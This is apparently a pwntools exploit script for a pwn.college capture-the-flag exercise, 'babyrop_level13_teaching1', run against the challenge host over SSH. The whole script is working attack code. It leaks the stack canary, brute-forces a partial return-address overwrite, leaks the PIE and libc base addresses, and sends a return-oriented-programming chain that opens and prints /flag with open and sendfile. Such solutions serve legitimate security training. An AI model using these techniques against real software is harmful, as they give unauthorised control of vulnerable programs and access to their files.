from pwn import *
import traceback

e = ELF('./babyrop_level13_teaching1')
libc = ELF('../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../key',port=22)

# context.log_level = 0

COUNT = 0

while 1:
    context.log_level = 20
    try:
        COUNT += 1
        print(COUNT, end='\t')
        p = s.run('/babyrop_level13_teaching1')

        p.recvuntil(b'[LEAK] Your input buffer is located at: ')
        leak = int(p.recvuntil(b'.',drop=True),16)

        canary_addr = leak + 0x68

        p.sendlineafter(b'from:',hex(canary_addr))

        p.recvuntil(b'= 0x')
        canary = bytes.fromhex(p.recvline().strip().decode())[::-1]
        print((canary).hex())

        pay = b'A' * 0x68
        pay += canary
        pay += p64(0)
# pay += b'\```                                                                                                                 x71\x48\x89'
        pay += (0x9a0871).to_bytes(3,'little')

        p.sendafter(b'\n',pay)
        p.recvuntil(b'Exiting!\n')

        p.recvuntil(b'###')
        # p.interactive()
        context.log_level = 0
        input("WIN!")
        pause()

        print(p.recvuntil(b'[LEAK] Your input buffer is located at:',timeout=10))

        leak = int(p.recvuntil(b'.',drop=True),16)
        pie_addr = leak + 0x38
        
        p.sendlineafter(b'from:',hex(pie_addr))

        p.recvuntil(b'= 0x')
        pie = int(p.recvline().strip().decode(),16) - 0x220d
        print(hex(pie))

        e.address = pie
        bss = e.bss() + 0x200

        rdi = 0x0000000000002223 + pie
        rsi_r15 = 0x0000000000002221 + pie
        ret = 0x000000000000101a + pie

        pay = b'A' * 0x68
        pay += canary
        pay += p64(0)
        # pay += p64(rdi) + p64(e.got['puts']) + p64(e.plt['puts'])
        pay += p64(rsi_r15) + p64(e.got['puts']) + p64(0) + p64(e.symbols['main'])

        p.sendafter(b'\n',pay)
        p.recvuntil(b'Exiting!\n')
        p.recvuntil(b'[LEAK] Your input buffer is located at: ')
        
        leak = int(p.recvuntil(b'.',drop=True),16)
        ret_addr = e.got['puts']
        
        p.sendlineafter(b'from:',hex(ret_addr))

        p.recvuntil(b'= 0x')
        base = int(p.recvline().strip().decode(),16) - libc.symbols['puts']
        libc.address = base

        print(hex(base))
        
        rcx = 0x000000000009f822 + base
        rsi = 0x0000000000027529 + base
        rdx_r12 = 0x000000000011c371 + base

        pay = b'/flag\x00'
        pay += b'A' * (0x68 - len(pay))
        pay += canary
        pay += p64(0)
        pay += p64(rdi) + p64(leak) + p64(rsi) + p64(0) + p64(libc.symbols['open'])
        pay += p64(rdi) + p64(1) + p64(rsi) + p64(3) + p64(rdx_r12) + p64(0) + p64(0) + p64(rcx) + p64(100) + p64(libc.symbols['sendfile'])

        p.sendafter(b'\n',pay)
        p.recvuntil(b'Exiting!\n')

        p.interactive()

    except KeyboardInterrupt:
        traceback.print_exc(10)
        exit(1)
    except Exception as ex:
        traceback.print_exc(1)
        pass